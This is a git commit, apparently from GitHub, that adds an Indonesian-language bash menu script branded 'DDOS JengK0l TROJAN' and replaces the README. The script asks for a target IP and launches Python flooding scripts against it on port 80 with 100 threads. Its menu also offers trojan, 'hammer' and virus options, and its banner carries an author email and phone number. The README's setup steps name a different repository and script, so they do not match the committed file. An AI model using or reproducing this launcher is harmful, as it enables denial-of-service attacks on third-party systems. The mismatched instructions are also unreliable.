99faab8c18725220d0121a15cc14bd498cd087a4
fahtudinali <50522937+fahtudinali@users.noreply.github.com>
2019-05-30 07:01:44 +0700

    JengK0l-Ddos

---
+++ JengK0l-Ddos.sh
@@ -0,0 +1,52 @@
+blue='\033[34;1m'
+green='\033[32;1m'  
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'                                           
+yellow='\033[33;1m'
+clear
+toilet -f slant " DDOS JengK0l TROJAN " |lolcat
+echo
+echo
+echo $blue"---------------------------------------"
+echo $blue"AUTOUR  :MrJengK0l / MrJengK0l Cyber Team "
+echo $blue"VERSION :1.0"
+echo $blue"JUDUL     :DDOS JengK0l TROJAN "
+echo $red"---------------------------------------"
+echo $green"?Contact :falinmal@gmail.com         "
+echo $green"?WhatsApp:+6282297371064             "
+echo $green"?Message :Jangan asal recod bray     "
+echo $red"---------------------------------------"
+echo $yellow"              JengK0l               "
+echo $red"---------------------------------------"
+echo $white"[1].JengK0l TROJAN"
+echo $white"[2].JengK0l DROID"
+echo $white"[3].JengK0l DDOS"
+echo $white"[4].JengK0l HAMMER"
+echo $white"[5].JengK0l VIRUS"
+echo $white"[0].EXIT"
+echo $red"---------------------------------------"
+echo $red"MASUKAN PILIHAN ANDA"
+read -p "PILIH>>==>" bro;
+echo
+if [ $bro = 1 ] || [ $bro = 1 ]
+then
+clear
+toilet -f slant " JengK0l TROJAN " |lolcat
+echo $red"MASUKAN IP TARGET"
+read -p "===>" ipt
+clear
+echo
+python win.32.64.NT.py -s$ipt -p80 -t100
+fi
+
+if [ $bro = 2 ] || [ $bro = 2 ]
+then
+toilet -f slant " JengK0l DROID " |lolcat
+echo $red"MASUKAN IP TARGET"
+read -p "===>" ipt
+clear
+echo
+python andromeda.py -s$ipt -p80 -t100
+fi
--- README.md
+++ README.md
@@ -1,1 +1,14 @@
-# JengK0l-Ddos
+# MrDdos
+Tools By MrTamfanX Please  No Record Sir Thank You And Enjoy
+Jalankan Lah Dengan Perintah :
+$apt update && apt upgrade
+$apt install Bash
+$apt install python python2
+$apt install git
+$apt install php
+$git clone https://github.com/MrTamfanX/MrDdos
+$cd MrDdos
+$ls (L kecil Bukan I besar)
+$chmod +x *
+$ls
+$sh Tamfan-Ddos.sh
